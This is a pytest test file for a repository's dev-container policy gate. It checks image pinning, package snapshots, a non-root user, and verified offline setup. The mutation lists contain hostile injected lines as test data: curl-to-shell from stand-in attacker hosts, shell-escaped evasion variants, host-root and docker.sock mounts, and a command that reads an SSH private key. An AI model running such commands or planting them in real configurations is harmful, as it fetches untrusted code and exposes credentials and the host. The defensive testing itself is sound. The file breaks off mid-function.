"""Development container image, dev-container entry point, setup, and drift policy."""

from __future__ import annotations

import hashlib
import json
from pathlib import Path

import pytest
from tools.check_tooling_artifact_policy import (
    ARTIFACT_LOCK_PATH,
    PROFILES_PATH,
    evaluate_tooling_artifact_policy,
    select_tooling_host_profile,
    tooling_policy_sha256,
)

REPO_ROOT = Path(__file__).resolve().parents[3]

CONTAINER_HOST_PROFILE_ID = "container-ubuntu-24.04-x86_64"
BASE_IMAGE_ARTIFACT_ID = "devcontainer-base-image"
DOCKERFILE_PATH = ".devcontainer/Dockerfile"
DEVCONTAINER_PATH = ".devcontainer/devcontainer.json"


def _load(relative: str) -> dict:
    return json.loads((REPO_ROOT / relative).read_text(encoding="utf-8"))


def _container_host_profile(host_profile_id: str = CONTAINER_HOST_PROFILE_ID) -> dict:
    profiles = _load(PROFILES_PATH)
    hosts = [host for host in profiles["host_profiles"] if host["host_profile_id"] == host_profile_id]
    assert len(hosts) == 1
    return hosts[0]


def test_the_container_host_profile_resolves_one_reviewed_selection() -> None:
    selection = select_tooling_host_profile(REPO_ROOT, host_profile_id=CONTAINER_HOST_PROFILE_ID)
    host = selection["host_profile"]
    assert host["proof_support"] == "unsupported"
    assert host["host_security_control_changes"] == "prohibited"
    assert host["credential_refs"] == []
    assert {item["artifact_id"] for item in selection["artifacts"]} == set(host["bootstrap_payload_ids"])


def test_the_container_host_profile_binds_its_platform_manifest_in_the_lock() -> None:
    host = _container_host_profile()
    artifact = next(
        item for item in _load(ARTIFACT_LOCK_PATH)["artifacts"] if item["artifact_id"] == BASE_IMAGE_ARTIFACT_ID
    )
    assert artifact["artifact_class"] == "oci-image"
    assert artifact["policy_refs"] == ["oci-input-v1"]
    assert artifact["source"]["release"].startswith("sha256:")
    assert [platform["platform_id"] for platform in artifact["platforms"]] == [host["platform_id"]]
    assert artifact["platforms"][0]["host_profile_ids"] == [CONTAINER_HOST_PROFILE_ID]
    assert len(artifact["platforms"][0]["raw_manifest"]) == 1


def test_only_linux_x86_64_is_declared_for_the_container() -> None:
    profiles = _load(PROFILES_PATH)
    containers = [host for host in profiles["host_profiles"] if "base_image_artifact_ref" in host]
    assert [host["platform_id"] for host in containers] == ["linux-x86_64"]


def test_the_container_supplies_what_a_maintainer_needs_for_git_signing_and_review() -> None:
    packages = set(_container_host_profile()["development_package_ids"])
    assert {"openssh-client", "gnupg", "less", "nano", "make", "jq"} <= packages
    assert "sudo" not in packages


def test_native_host_profiles_are_unchanged_by_the_container_variant() -> None:
    profiles = _load(PROFILES_PATH)
    native = next(host for host in profiles["host_profiles"] if host["host_profile_id"] == "public-ubuntu-24.04-x86_64")
    for key in ("base_image_artifact_ref", "native_repository_snapshot", "development_user", "development_package_ids"):
        assert key not in native


def test_repository_tooling_policy_admits_the_container_artifacts() -> None:
    failures = evaluate_tooling_artifact_policy(REPO_ROOT)
    assert [failure.render() for failure in failures] == []


def test_qualification_records_bind_the_current_policy_digest() -> None:
    profiles = _load(PROFILES_PATH)
    expected = tooling_policy_sha256(REPO_ROOT)
    assert {record["policy_sha256"] for record in profiles["qualification_records"]} == {expected}


# --------------------------------------------------------------------------
# Container configuration drift and safety gate.
#
# Every expectation below is derived from the profile/lock authority through
# tools.devcontainer_image.build_plan, never from an expected string duplicated
# here, so a test cannot silently disagree with the reviewed authority.
# --------------------------------------------------------------------------


@pytest.fixture(scope="module")
def build_plan() -> dict:
    from tools.devcontainer_image import build_plan as render

    return render(host_profile_id=CONTAINER_HOST_PROFILE_ID)


def _container_failures(root: Path) -> set[str]:
    from tools.tooling_artifact_policy_common import load_documents
    from tools.tooling_artifact_policy_container import container_failures

    documents, failures = load_documents(root)
    assert not failures
    return {item.rule_id for item in container_failures(root, documents)}


def _stage(tmp_path: Path, *, dockerfile: str | None = None, config: dict | None = None) -> Path:
    """Copy the real authority plus the committed container artifacts, then mutate."""

    root = tmp_path / "repo"
    for relative in (
        PROFILES_PATH,
        ARTIFACT_LOCK_PATH,
        "implementations/tooling/admission-policy.json",
        "implementations/tooling/actions-policy.json",
        "implementations/tooling/selector-bindings.json",
        "implementations/tooling/inventory-coverage.json",
        DOCKERFILE_PATH,
        DEVCONTAINER_PATH,
    ):
        destination = root / relative
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes((REPO_ROOT / relative).read_bytes())
    schemas = root / "implementations" / "tooling" / "schemas"
    schemas.mkdir(parents=True, exist_ok=True)
    for schema in (REPO_ROOT / "implementations" / "tooling" / "schemas").iterdir():
        (schemas / schema.name).write_bytes(schema.read_bytes())
    if dockerfile is not None:
        (root / DOCKERFILE_PATH).write_text(dockerfile, encoding="utf-8")
    if config is not None:
        (root / DEVCONTAINER_PATH).write_text(json.dumps(config, indent=2) + "\n", encoding="utf-8")
    return root


def _dockerfile_text() -> str:
    return (REPO_ROOT / DOCKERFILE_PATH).read_text(encoding="utf-8")


def _config() -> dict:
    return json.loads((REPO_ROOT / DEVCONTAINER_PATH).read_text(encoding="utf-8"))


def _dockerfile_refusals(tmp_path: Path, old: str, new: str) -> set[str]:
    """Apply one effective Dockerfile substitution and return the refused rules."""

    original = _dockerfile_text()
    assert old in original, "the mutation must target text the committed image definition contains"
    return _container_failures(_stage(tmp_path, dockerfile=original.replace(old, new)))


def _config_refusals(tmp_path: Path, key: str, value: object) -> set[str]:
    config = _config()
    assert config.get(key) != value, "the mutation must change the committed dev-container configuration"
    config[key] = value
    return _container_failures(_stage(tmp_path, config=config))


def _final_stage_marker(build_plan: dict) -> str:
    return f"FROM --platform={build_plan['oci_platform']} {build_plan['base_image_reference']}\n"


def _mutate_profiles(root: Path, host_profile_id: str, key: str, value: object) -> None:
    path = root / PROFILES_PATH
    profiles = json.loads(path.read_text(encoding="utf-8"))
    host = next(item for item in profiles["host_profiles"] if item["host_profile_id"] == host_profile_id)
    assert host.get(key) != value
    host[key] = value
    path.write_text(json.dumps(profiles, indent=2) + "\n", encoding="utf-8")


def test_committed_container_configuration_is_admitted(tmp_path: Path) -> None:
    assert _container_failures(_stage(tmp_path)) == set()


def test_every_stage_is_pinned_to_the_reviewed_platform_manifest(build_plan: dict) -> None:
    stages = [line.split() for line in _dockerfile_text().splitlines() if line.startswith("FROM ")]
    assert stages
    assert {tuple(tokens[1:3]) for tokens in stages} == {
        (f"--platform={build_plan['oci_platform']}", build_plan["base_image_reference"])
    }
    assert build_plan["base_image_reference"].endswith(build_plan["base_image_digest"])


def test_a_floating_base_tag_is_refused(tmp_path: Path, build_plan: dict) -> None:
    refused = _dockerfile_refusals(tmp_path, build_plan["base_image_reference"], "docker.io/library/ubuntu:latest")
    assert "tooling-container-base-drift" in refused


def test_a_substituted_base_manifest_is_refused(tmp_path: Path, build_plan: dict) -> None:
    refused = _dockerfile_refusals(tmp_path, build_plan["base_image_digest"], "sha256:" + "b" * 64)
    assert "tooling-container-base-drift" in refused


def test_the_multi_architecture_index_in_place_of_the_platform_manifest_is_refused(
    tmp_path: Path, build_plan: dict
) -> None:
    refused = _dockerfile_refusals(tmp_path, build_plan["base_image_digest"], build_plan["base_image_index_digest"])
    assert "tooling-container-base-drift" in refused


@pytest.mark.parametrize("replacement", ["FROM --platform=linux/arm64 ", "FROM "])
def test_a_stage_without_the_qualified_platform_is_refused(tmp_path: Path, build_plan: dict, replacement: str) -> None:
    marker = f"FROM --platform={build_plan['oci_platform']} "
    text = _dockerfile_text()
    mutated = text.replace(marker, replacement, 1)
    assert mutated != text
    assert "tooling-container-platform" in _container_failures(_stage(tmp_path, dockerfile=mutated))


def test_a_drifting_package_snapshot_is_refused(tmp_path: Path, build_plan: dict) -> None:
    refused = _dockerfile_refusals(tmp_path, build_plan["native_repository_snapshot"], "20200101T000000Z")
    assert "tooling-container-snapshot-drift" in refused


def test_an_unsnapshotted_final_stage_install_is_refused(tmp_path: Path, build_plan: dict) -> None:
    option = f"-o APT::Snapshot={build_plan['native_repository_snapshot']} "
    text = _dockerfile_text()
    final_stage = text.index(_final_stage_marker(build_plan))
    mutated = text[:final_stage] + text[final_stage:].replace(option, "")
    assert mutated != text
    assert "tooling-container-snapshot-drift" in _container_failures(_stage(tmp_path, dockerfile=mutated))


def test_the_transport_trust_bundle_cannot_be_installed_in_the_final_stage_from_the_moving_archive(
    tmp_path: Path, build_plan: dict
) -> None:
    marker = _final_stage_marker(build_plan)
    injected = f"{marker}RUN apt-get update; apt-get install -y ca-certificates\n"
    assert "tooling-container-snapshot-drift" in _dockerfile_refusals(tmp_path, marker, injected)


def test_a_builder_stage_may_not_install_unreviewed_packages(tmp_path: Path) -> None:
    refused = _dockerfile_refusals(
        tmp_path,
        "--no-install-recommends ca-certificates\n",
        "--no-install-recommends ca-certificates build-essential\n",
    )
    assert "tooling-container-package-drift" in refused


def test_an_unreviewed_extra_package_is_refused(tmp_path: Path) -> None:
    assert "tooling-container-package-drift" in _dockerfile_refusals(
        tmp_path, "        git \\\n", "        git \\\n        sudo \\\n"
    )


@pytest.mark.parametrize("package", ["gh", "nano", "openssh-client"])
def test_a_missing_reviewed_package_is_refused(tmp_path: Path, package: str) -> None:
    assert "tooling-container-package-drift" in _dockerfile_refusals(tmp_path, f"        {package} \\\n", "")


def test_a_package_upgrade_outside_the_snapshot_is_refused(tmp_path: Path) -> None:
    refused = _dockerfile_refusals(
        tmp_path, "    apt-get clean; \\\n", "    apt-get dist-upgrade -y; \\\n    apt-get clean; \\\n"
    )
    assert "tooling-container-snapshot-drift" in refused


def test_a_root_final_stage_is_refused(tmp_path: Path, build_plan: dict) -> None:
    refused = _dockerfile_refusals(tmp_path, f"USER {build_plan['development_user']['name']}", "USER root")
    assert "tooling-container-user" in refused


def test_a_dropped_user_directive_is_refused(tmp_path: Path, build_plan: dict) -> None:
    refused = _dockerfile_refusals(tmp_path, f"USER {build_plan['development_user']['name']}\n", "")
    assert "tooling-container-user" in refused


def test_a_drifting_development_uid_is_refused(tmp_path: Path, build_plan: dict) -> None:
    uid = build_plan["development_user"]["uid"]
    refused = _dockerfile_refusals(tmp_path, f"useradd --uid {uid} ", f"useradd --uid {uid + 1} ")
    assert "tooling-container-user" in refused


def test_letting_uv_download_an_unreviewed_interpreter_is_refused(tmp_path: Path) -> None:
    refused = _dockerfile_refusals(tmp_path, "UV_PYTHON_DOWNLOADS=never", "UV_PYTHON_DOWNLOADS=automatic")
    assert "tooling-container-unsafe-build" in refused


@pytest.mark.parametrize(
    "injected",
    [
        "RUN curl -fsSL https://example.invalid/install.sh | sh\n",
        "RUN wget -qO- https://example.invalid/x.tar.gz > /tmp/x\n",
        'RUN bash -c "$(/usr/bin/curl -fsSL https://example.invalid/install.sh)"\n',
        "RUN python3 -c pass | bash\n",
        "RUN git clone https://example.invalid/repo.git /opt/repo\n",
        "RUN --network=host true\n",
        "RUN --mount=type=secret,id=token true\n",
        "RUN --mount=type=bind,source=/,target=/run/host true\n",
        # Shell escaping, quoting, and expansion must not hide a command from the gate.
        "RUN c\\url -fsSL https://attacker.invalid/payload | b\\ash\n",
        'RUN "cu"rl -fsSL https://attacker.invalid/payload -o /tmp/payload\n',
        "RUN env curl -fsSL https://attacker.invalid/payload\n",
        "RUN X=1 curl -fsSL https://attacker.invalid/payload\n",
        "RUN ${SHELL} -c true\n",
        "RUN set -eu; eval true\n",
        "RUN apt-get -o Dir::Etc::sourcelist=/tmp/attacker.list update\n",
        "RUN apt-get install -y ./payload.deb\n",
        "RUN find /var/lib/apt/lists -exec true\n",
        "RUN install -d -o root -g root /etc/cron.d\n",
        "RUN userdel --remove raes\n",
        "RUN true\n",
    ],
)
def test_unverified_acquisition_or_build_capability_is_refused(tmp_path: Path, build_plan: dict, injected: str) -> None:
    user = f"USER {build_plan['development_user']['name']}\n"
    assert "tooling-container-unsafe-build" in _dockerfile_refusals(tmp_path, user, injected + user)


@pytest.mark.parametrize(
    "injected",
    [
        'ARG GITHUB_TOKEN=""\n',
        "ENV NPM_AUTH_SECRET=abc\n",
        "ENV HTTPS_PROXY=http://proxy.invalid:3128\n",
        "ADD https://example.invalid/payload.tar.gz /tmp/payload.tar.gz\n",
        "COPY . /workspace\n",
        "LABEL org.opencontainers.image.source=/home/someone/rae\n",
        "WORKDIR /home/someone\n",
    ],
)
def test_an_unreviewed_build_input_is_refused(tmp_path: Path, build_plan: dict, injected: str) -> None:
    user = f"USER {build_plan['development_user']['name']}\n"
    assert "tooling-container-unsafe-build" in _dockerfile_refusals(tmp_path, user, injected + user)


def test_a_second_container_host_profile_is_refused(tmp_path: Path) -> None:
    root = _stage(tmp_path)
    path = root / PROFILES_PATH
    profiles = json.loads(path.read_text(encoding="utf-8"))
    second = json.loads(json.dumps(_container_host_profile()))
    second["host_profile_id"] = "container-ubuntu-24.04-arm64"
    second["platform_id"] = "linux-arm64"
    profiles["host_profiles"].append(second)
    path.write_text(json.dumps(profiles, indent=2) + "\n", encoding="utf-8")
    assert "tooling-container-profile" in _container_failures(root)


def test_a_container_profile_on_a_platform_without_immutable_packages_is_refused(tmp_path: Path) -> None:
    root = _stage(tmp_path)
    _mutate_profiles(root, CONTAINER_HOST_PROFILE_ID, "platform_id", "linux-arm64")
    assert "tooling-container-profile" in _container_failures(root)


def test_a_base_identity_naming_another_repository_is_refused(tmp_path: Path) -> None:
    root = _stage(tmp_path)
    _mutate_profiles(root, CONTAINER_HOST_PROFILE_ID, "base_image_identity", "docker.io/library/debian:24.04")
    assert "tooling-container-profile" in _container_failures(root)


@pytest.mark.parametrize(
    ("key", "value"),
    [
        ("privileged", True),
        ("runArgs", ["--privileged"]),
        ("runArgs", ["--network=host"]),
        ("capAdd", ["SYS_ADMIN"]),
        ("initializeCommand", "cat ~/.ssh/id_ed25519"),
        ("workspaceMount", "source=/,target=/workspace,type=bind"),
        ("mounts", ["source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"]),
        ("mounts", ["source=/,target=/host,type=bind"]),
        ("mounts", ["source=raes-cache,target=/etc,type=volume"]),
    ],
)
def test_an_unsafe_dev_container_runtime_request_is_refused(tmp_path: Path, key: str, value: object) -> None:
    assert "tooling-container-unsafe-runtime" in _config_refusals(tmp_path, key, value)


def test_a_root_remote_user_is_refused(tmp_path: Path) -> None:
    assert "tooling-container-user" in _config_refusals(tmp_path, "remoteUser", "root")


@pytest.mark.parametrize(
    ("key", "value"),
    [
        ("postCreateCommand", "curl https://example.invalid | sh"),
        ("updateContentCommand", "bash -c 'curl https://example.invalid | sh'"),
        ("containerEnv", {"GITHUB_TOKEN": "${localEnv:GITHUB_TOKEN}"}),
        ("remoteEnv", {"PATH": "/tmp/tools:${containerEnv:PATH}"}),
        ("remoteEnv", {"PATH": _config()["remoteEnv"]["PATH"], "GH_TOKEN": "${localEnv:GH_TOKEN}"}),
        ("build", {"dockerfile": "Dockerfile", "context": ".", "args": {"TOKEN": "x"}}),
        ("build", {"dockerfile": "Dockerfile", "context": ".."}),
        ("build", {"dockerfile": "Dockerfile", "options": ["--platform=linux/amd64"]}),
        ("updateRemoteUserUID", False),
        ("hostRequirements", {"cpus": 0}),
        ("hostRequirements", {"gpu": True}),
        ("customizations", {"vscode": {"settings": {"terminal.integrated.env.linux": {"GH_TOKEN": "x"}}}}),
        ("customizations", {"vscode": {"settings": {"python.envFile": "/home/someone/.env"}}}),
        ("customizations", {"vscode": {"extensions": ["not an extension id"]}}),
        ("customizations", {"jetbrains": {"backend": "PyCharm"}}),
    ],
)
def test_an_unreviewed_dev_container_input_is_refused(tmp_path: Path, key: str, value: object) -> None:
    assert "tooling-container-config-shape" in _config_refusals(tmp_path, key, value)


def test_a_dev_container_without_its_setup_command_is_refused(tmp_path: Path) -> None:
    config = _config()
    del config["updateContentCommand"]
    assert "tooling-container-config-shape" in _container_failures(_stage(tmp_path, config=config))


def test_a_duplicate_dev_container_key_is_refused(tmp_path: Path) -> None:
    root = _stage(tmp_path)
    path = root / DEVCONTAINER_PATH
    text = path.read_text(encoding="utf-8")
    path.write_text(
        text.replace('"remoteUser": "raes",', '"remoteUser": "raes",\n  "remoteUser": "raes",'), encoding="utf-8"
    )
    assert path.read_text(encoding="utf-8") != text
    assert "tooling-container-config-shape" in _container_failures(root)


# --------------------------------------------------------------------------
# Boundaries the image must not quietly cross.
# --------------------------------------------------------------------------


def test_proof_execution_fails_with_a_capability_diagnosis(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A host without bubblewrap must refuse the proof, never skip or relax it.

    The development image declares `proof_support: unsupported` and installs no
    bubblewrap, so this is the diagnosis a contributor actually receives there:
    the missing isolation capability, before any prover distribution is needed.
    """

    from tools import isabelle_tool

    def distribution_must_not_be_resolved(repo_root=None):
        raise AssertionError("the prover distribution was resolved before the host capability diagnosis")

    monkeypatch.setattr(isabelle_tool, "require_isabelle", distribution_must_not_be_resolved)
    with pytest.raises(isabelle_tool.IsabelleToolError) as caught:
        isabelle_tool.run_isabelle_build(tmp_path, bwrap=tmp_path / "absent-bwrap")
    assert "bubblewrap is required" in str(caught.value)


def test_the_proof_gate_reports_a_capability_diagnosis_not_a_traceback(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    from tools import check_participant_opacity_proof as proof_gate
    from tools.isabelle_tool import IsabelleToolError

    def unsupported_host(_manifest: object) -> None:
        raise IsabelleToolError("bubblewrap is required to enforce offline proof replay")

    monkeypatch.setattr(proof_gate, "load_proof_manifest", lambda: {})
    monkeypatch.setattr(proof_gate, "validate_proof_manifest", unsupported_host)
    assert proof_gate.main() == 1
    captured = capsys.readouterr()
    assert captured.err == "participant-opacity-proof: bubblewrap is required to enforce offline proof replay\n"
    assert "verified" not in captured.out


def test_the_container_profile_claims_no_proof_support() -> None:
    host = _container_host_profile()
    assert host["proof_support"] == "unsupported"
    assert "bubblewrap" not in host["offline_kit"]["host_prerequisite_package_ids"]
    assert "isabelle" not in host["bootstrap_payload_ids"]


def test_the_image_neither_supplies_nor_implies_a_container_daemon() -> None:
    text = (REPO_ROOT / DOCKERFILE_PATH).read_text(encoding="utf-8")
    host = _container_host_profile()
    assert not {"docker.io", "docker-ce", "podman", "containerd"} & set(
        host["offline_kit"]["host_prerequisite_package_ids"]
    )
    assert "docker.sock" not in text
    assert "docker.sock" not in (REPO_ROOT / DEVCONTAINER_PATH).read_text(encoding="utf-8")


def test_the_image_bakes_no_credential_or_checkout() -> None:
    text = (REPO_ROOT / DOCKERFILE_PATH).read_text(encoding="utf-8")
    assert "COPY" not in text
    assert "ADD " not in text


def test_the_checkout_is_mounted_by_the_client_without_taking_ownership() -> None:
    config = _config()
    # Codespaces and local clients mount the checkout at their default
    # workspace; the client remaps the development account to its owner.
    assert "workspaceMount" not in config
    assert config.get("updateRemoteUserUID", True) is True
    assert "chown" not in _dockerfile_text()


def _image_environment() -> dict[str, str]:
    from tools.tooling_artifact_policy_container import _instructions

    environment: dict[str, str] = {}
    for keyword, arguments in _instructions(_dockerfile_text()):
        if keyword == "ENV":
            environment.update(token.split("=", maxsplit=1) for token in arguments.split())
    return environment


def test_every_new_terminal_finds_the_locked_clients_the_setup_installs() -> None:
    from tools.devcontainer_setup import PYTHON_LINK_NAME

    environment = _image_environment()
    kit = Path(environment["XDG_CACHE_HOME"]) / "raes-bootstrap"
    assert environment["PATH"].split(":")[0] == str(kit / "bin")
    assert environment["UV_PYTHON"] == str(kit / "python" / PYTHON_LINK_NAME / "bin" / "python3")
    assert environment["UV_PYTHON_DOWNLOADS"] == "never"
    assert environment["UV_LINK_MODE"] == "copy"
    remote_path = _config()["remoteEnv"]["PATH"]
    assert remote_path.startswith("${containerWorkspaceFolder}/implementations/tooling/python/.venv/bin:")


def test_the_tool_environment_on_path_provides_the_maintainer_commands() -> None:
    import tomllib

    project = tomllib.loads((REPO_ROOT / "implementations/tooling/python/pyproject.toml").read_text(encoding="utf-8"))
    requirements = " ".join(project["project"]["dependencies"]).lower()
    for command in ("nox", "pre-commit", "ruff"):
        assert command in requirements


def test_the_editor_uses_the_locked_interpreter_and_formatter() -> None:
    settings = _config()["customizations"]["vscode"]["settings"]
    assert settings["python.defaultInterpreterPath"].endswith("/implementations/python/.venv/bin/python")
    assert settings["ruff.path"] == ["${containerWorkspaceFolder}/implementations/tooling/python/.venv/bin/ruff"]


# --------------------------------------------------------------------------
# One-step container setup.
# --------------------------------------------------------------------------


def test_setup_selects_the_container_profile_for_the_running_platform() -> None:
    from tools.devcontainer_setup import container_host_profile_id

    assert container_host_profile_id(REPO_ROOT, "linux-x86_64") == CONTAINER_HOST_PROFILE_ID


def test_setup_refuses_an_architecture_without_a_qualified_container_profile() -> None:
    from tools.devcontainer_setup import DevcontainerSetupError, container_host_profile_id

    for platform_id in ("linux-arm64", "macos-arm64"):
        with pytest.raises(DevcontainerSetupError, match="no reviewed development container profile"):
            container_host_profile_id(REPO_ROOT, platform_id)


class _FakeBootstrap:
    """Stand-in for the verified installers that records what setup asked of them."""

    def __init__(self, payloads: dict[str, bytes], *, fail_install: bool = False) -> None:
        self.payloads = payloads
        self.fail_install = fail_install
        self.fetched: list[list[str]] = []

    def selection(self, _host_profile_id: str) -> dict:
        artifacts = []
        for artifact_id, implementation in (("cpython-3.14", "CPython"), ("uv", "uv")):
            content = self.payloads[artifact_id]
            raw = {"path": f"{artifact_id}.tar.gz", "sha256": hashlib.sha256(content).hexdigest(), "size": len(content)}
            identity = {"implementation": implementation, "version": "1", "abi": "native", "target": "t"}
            artifacts.append(
                {"artifact_id": artifact_id, "platform": {"raw_manifest": [raw], "installed_identity": identity}}
            )
        return {"artifacts": artifacts}

    def fetch(self, _host: str, kit: Path, artifact_ids: list[str]) -> list[dict]:
        self.fetched.append(sorted(artifact_ids))
        for artifact_id in artifact_ids:
            target = kit / "archives" / artifact_id / f"{artifact_id}.tar.gz"
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(self.payloads[artifact_id])
        return []

    def install_uv(self, _host: str, kit: Path, _artifact_id: str) -> dict:
        (kit / "bin").mkdir()
        (kit / "bin" / "uv").write_text("uv", encoding="utf-8")
        return {}

    def install_python(self, _host: str, kit: Path, _artifact_id: str) -> dict:
        if self.fail_install:
            raise ValueError("offline kit Python archive differs from the validated lock")
        (kit / "python" / "cpython-3.14.7" / "bin").mkdir(parents=True)
        return {"path": "python/cpython-3.14.7"}


@pytest.fixture
def fake_bootstrap(monkeypatch: pytest.MonkeyPatch) -> _FakeBootstrap:
    from tools import bootstrap_profile, tooling_policy_gate

    fake = _FakeBootstrap({"cpython-3.14": b"python-archive", "uv": b"uv-archive"})
    monkeypatch.setattr(
        tooling_policy_gate, "load_tooling_host_profile_selection_with_current_interpreter", fake.selection
    )
    monkeypatch.setattr(bootstrap_profile, "fetch_offline_kit_payloads", fake.fetch)
    monkeypatch.setattr(bootstrap_profile, "install_offline_uv_payload", fake.install_uv)
    monkeypatch.setattr(bootstrap_profile, "install_offline_python_payload", fake.install_python)
    return fake


def test_setup_fetches_once_then_reuses_only_archives_that_still_verify(
    tmp_path: Path, fake_bootstrap: _FakeBootstrap
) -> None:
    from tools.devcontainer_setup import PYTHON_LINK_NAME, prepare_kit

    kit = tmp_path / "cache" / "raes-bootstrap"
    prepare_kit(CONTAINER_HOST_PROFILE_ID, kit)
    assert fake_bootstrap.fetched == [["cpython-3.14", "uv"]]
    assert (kit / "python" / PYTHON_LINK_NAME / "bin").is_dir()
    assert (kit / "bin" / "uv").is_file()

    prepare_kit(CONTAINER_HOST_PROFILE_ID, kit)
    assert fake_bootstrap.fetched == [["cpython-3.14", "uv"]]

    (kit / "archives" / "uv" / "uv.tar.gz").write_bytes(b"tampered")
    prepare_kit(CONTAINER_HOST_PROFILE_ID, kit)
    assert fake_bootstrap.fetched[-1] == ["uv"]
    assert (kit / "archives" / "uv" / "uv.tar.gz").read_bytes() == b"uv-archive"
    assert sorted(path.name for path in kit.parent.iterdir()) == ["raes-bootstrap"]


def test_a_failed_setup_keeps_the_previous_kit_and_leaves_no_staging(
    tmp_path: Path, fake_bootstrap: _FakeBootstrap
) -> None:
    from tools.devcontainer_setup import prepare_kit

    kit = tmp_path / "cache" / "raes-bootstrap"
    prepare_kit(CONTAINER_HOST_PROFILE_ID, kit)
    fake_bootstrap.fail_install = True
    with pytest.raises(ValueError, match="differs from the validated lock"):
        prepare_kit(CONTAINER_HOST_PROFILE_ID, kit)
    assert (kit / "bin" / "uv").is_file()
    assert sorted(path.name for path in kit.parent.iterdir()) == ["raes-bootstrap"]


def test_setup_syncs_both_locked_environments_with_the_verified_clients(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from tools import devcontainer_setup

    calls: list[tuple[list[str], dict[str, str]]] = []
    monkeypatch.setattr(devcontainer_setup, "_run", lambda argv, _root, env: calls.append((list(argv), dict(env))))
    kit = tmp_path / "raes-bootstrap"
    devcontainer_setup.sync_projects(REPO_ROOT, kit)
    assert [argv[1:4] for argv, _env in calls] == [
        ["sync", "--project", "implementations/python"],
        ["sync", "--project", "implementations/tooling/python"],
    ]
    assert all("--frozen" in argv and argv[0] == str(kit / "bin" / "uv") for argv, _env in calls)
    assert {env["UV_PYTHON_DOWNLOADS"] for _argv, env in calls} == {"never"}


def test_setup_skips_hooks_when_the_git_directory_is_outside_the_container(tmp_path: Path) -> None:
    from tools.devcontainer_setup import install_git_hooks

    checkout = tmp_path / "worktree"
    checkout.mkdir()
    (checkout / ".git").write_text("gitdir: /host/only/repo/.git/worktrees/feature\n", encoding="utf-8")
    assert install_git_hooks(checkout, tmp_path / "kit").startswith("skipped")


def test_setup_reports_a_failure_as_one_clear_line(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    from tools import devcontainer_setup

    def unavailable(*_args: object, **_kwargs: object) -> None:
        raise devcontainer_setup.DevcontainerSetupError("no reviewed development container profile is qualified for x")

    monkeypatch.setattr(devcontainer_setup, "setup", unavailable)
    assert devcontainer_setup.main([]) == 1
    assert (
        capsys.readouterr().err == "devcontainer-setup: no reviewed development container profile is qualified for x\n"
    )


def test_the_locked_uv_client_installs_only_from_its_verified_archive(tmp_path: Path) -> None:
    from tools import bootstrap_profile

    kit = tmp_path / "kit"
    (kit / "archives" / "uv").mkdir(parents=True)
    (kit / "archives" / "uv" / "uv-x86_64-unknown-linux-gnu.tar.gz").write_bytes(b"not the reviewed archive")
    with pytest.raises(ValueError) as caught:
        bootstrap_profile.install_offline_uv_payload("container-ubuntu-24.04-x86_64", kit, "uv")
    assert "differs from the validated lock" in str(caught.value)


def _uv_kit(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, members: dict[str, bytes | str]) -> Path:
    """Stage one uv archive and bind the host selection to its exact digest and size.

    A ``str`` member value is a symlink target; ``bytes`` is regular file content.
    """

    import hashlib
    import io
    import tarfile

    from tools import bootstrap_profile

    kit = tmp_path / "kit"
    archive = kit / "archives" / "uv" / "uv.tar.gz"
    archive.parent.mkdir(parents=True)
    with tarfile.open(archive, mode="w:gz") as bundle:
        for name, content in members.items():
            info = tarfile.TarInfo(name)
            if isinstance(content, str):
                info.type = tarfile.SYMTYPE
                info.linkname = content
                bundle.addfile(info)
            else:
                info.size = len(content)
                info.mode = 0o644
                bundle.addfile(info, io.BytesIO(content))
    raw = {
        "path": "uv.tar.gz",
        "sha256": hashlib.sha256(archive.read_bytes()).hexdigest(),
        "size": archive.stat().st_size,
    }
    selection = {"uv": {"artifact_id": "uv", "platform": {"raw_manifest": [raw]}}}
    monkeypatch.setattr(bootstrap_profile, "_load_host_selection", lambda _host: ({}, selection, "0" * 64))
    return kit


def test_the_locked_uv_client_is_extracted_as_new_executables(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from tools import bootstrap_profile

    kit = _uv_kit(tmp_path, monkeypatch, {"uv-root/uv": b"uv", "uv-root/uvx": b"uvx"})
    result = bootstrap_profile.install_offline_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv")
    assert result == {"artifact_id": "uv", "path": "bin/uv", "extra_path": "bin/uvx"}
    for name in ("uv", "uvx"):
        installed = kit / "bin" / name
        assert installed.read_bytes() == name.encode()
        assert installed.stat().st_mode & 0o111 == 0o111
    with pytest.raises(ValueError, match="destination uv must be new"):
        bootstrap_profile.install_offline_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv")


@pytest.mark.parametrize(
    ("members", "reason"),
    [
        ({"uv-root/uv": b"uv", "uv-root/uvx": "uv"}, "unexpected shape"),
        ({"uv-root/uv": b"uv", "other-root/uvx": b"uvx"}, "unexpected shape"),
        ({"uv-root/uv": b"uv"}, "omits its uvx client"),
    ],
)
def test_an_unexpected_uv_archive_shape_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, members: dict[str, bytes | str], reason: str
) -> None:
    from tools import bootstrap_profile

    kit = _uv_kit(tmp_path, monkeypatch, members)
    with pytest.raises(ValueError, match=reason):
        bootstrap_profile.install_offline_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv")


def test_a_uv_payload_outside_the_host_selection_is_refused(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from tools import bootstrap_profile

    kit = _uv_kit(tmp_path, monkeypatch, {"uv-root/uv": b"uv", "uv-root/uvx": b"uvx"})
    with pytest.raises(ValueError, match="not selected by the host profile"):
        bootstrap_profile.install_offline_uv_payload(CONTAINER_HOST_PROFILE_ID, kit, "uv-unreviewed")


def _launcher_selection(document: dict, *, version: str):
    """Parse one validator response through the launcher's closed selection boundary."""

    from tools import tooling_policy_gate

    selection, selected_profile_ids = tooling_policy_gate._selection_from_document(document, "public-linux-x86_64")
    if not tooling_policy_gate._selection_is_valid(
        selection,
        selected_profile_ids,
        artifact_id=document["artifact_id"],
        version=version,
        platform_id="linux-x86_64",
        profile_id="public-linux-x86_64",
    ):
